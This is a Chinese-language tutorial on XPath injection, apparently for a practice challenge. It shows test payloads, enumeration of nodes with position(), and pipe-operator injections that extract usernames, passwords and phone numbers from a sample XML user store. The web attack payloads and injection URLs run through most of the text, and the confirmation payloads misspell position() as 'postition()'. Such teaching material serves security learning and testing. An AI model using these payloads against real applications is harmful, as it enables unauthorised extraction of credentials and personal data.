##XPATH注入：遍历元素和实体

我们将在本教程中讨论以下内容。

1. 测试并确认XPATHi 
2. 遍历节点
3. 从兄弟节点中提取数据

当我们看到一个输入字符时，我们要检查的第一件事是使用下面的payload来测试它：
```
1 or 1=1
1 or true
' or ''='
" or ""="
```
而在XPATH或SQLi等许多其他注入的情况下，它们的工作原理是一样的。所以现在要确认它的XPATHi是否可以使用`position()`函数，这是XPATH特有的。
以下是我们可以尝试的一些测试：
```
1 or postition()=1 or 1=1
1 or postition()=1 or true
' or postition()=1 or ''='
" or postition()=1 or ""="
```
如果上述任何一个payload工作，那么你可以假设你正在处理的注入是XPATH注入。下面是本教程中将要使用的示例XML文件：
```
<xmlfile>
<users>
	<user>
		<name first="Zenodermus" last="Javanicus"/>
		<id>1</id>
		<username>Zen</username>
		<password>n00b_132</password>
		<phone>123-456-7890</phone>
	</user>
	<user>
		<name first="Rahul" last="Maane"/>
		<id>2</id>
		<username>Monster</username>
		<password>i_om-GAWWWD</password>
		<phone>603-478-4115</phone>
	</user>
	<user>
		<name first="Ashx" last="Khan"/>
		<id>3</id>
		<username>Trojan</username>
		<password>ihavemoregfsthanyou</password>
		<phone>222-222-2222</phone>
	</user>
	<user>
		<name first="Rummy" last="Khan"/>
		<id>4</id>
		<username>CyberGh0st</username>
		<password>SelectPassFromDual</password>
		<phone>88-777-8989</phone>
	</user>
</users>
</xmlfile>
```
现在这里有一些基本的XPATH查询可用于从上述文件中提取数据：
```
提取id = 1的用户名
/xmlfile/users/user[id='1']/username
提取id = 2的用户名
/xmlfile/users/user[id='2']/username
提取username=Monster的用户的密码
/xmlfile/users/user[username="Monster"]/password
提取username=Trojan,password=ihavemoregfsthanyou的用户的电话
/xmlfile/users/user[username="Trojan" and password="ihavemoregfsthanyou"]/phone
提取第一个用户名
/xmlfile/users/user[position()=1]/username
```
2.遍历节点

在我们开始注入之前，让我们假设内部查询可能是什么，它应该是

`"/root/semething/user[username="<Our_Intput_here>"]/phone" `

假设是这样我们可以尝试下面的注入：

`/challenge_2.php?username='or''='`

我们得到了第一个用户的数量，现在得到第二个用户的数量，我们将使用position()，就像我之前使用的那样

`/challenge_2.php?username='or position()=2 and''='`

并且我们获得了第二个用户的数量，所以我们可以不断更改position()来获取剩余的用户电话号码。

`/challenge_2.php?username='or position()=3 and''='`

而且我们得到了第三位用户的数量，所以我们可以不断更改position()来获取剩余的用户电话号码。

在这里，我们完成了对节点的迭代，但问题是我们无法提取其他细节，如密码等。应该必须保存在同一个XML文件中。现在来看下一步，我们甚至可以列举我们想要的任何其他细节。

3.从相邻的兄弟姐妹节点提取数据

到目前为止，我们使用的是位置position，所以我们只能通过节点枚举，但是/phone最终是硬编码的，所以我们不能改变它来提取其他数据。但不要担心！我们有一个Pipe运算符，它用于在XPATH中组合两个查询。看我们如何做到这一点：
```
/challenge_2.php?username=' or position()=1]/*[2]|/a['
上面的注入从第一个节点中提取第二个元素。
/challenge_2.php?username=' or position()=1]/*[3]|/a['
上面的注入从第一个节点中提取第三个元素。
/challenge_2.php?username=' or position()=1]/*[4]|/a['
上面的注入从第一个节点中提取Forth元素。
/challenge_2.php?username=' or position()=1]/*[5]|/a['
上面的注入从第一个节点中提取第五个元素。
/challenge_2.php?username=' or position()=2]/*[2]|/a['
在这里我改变了位置，这意味着它会从第二个节点的第二个元素提取数据，所以你可以不断改变和提取。
```
使用这个我们可以提取所有内部文件结构的数据，在这里尝试提取所有用户的用户名和密码。 





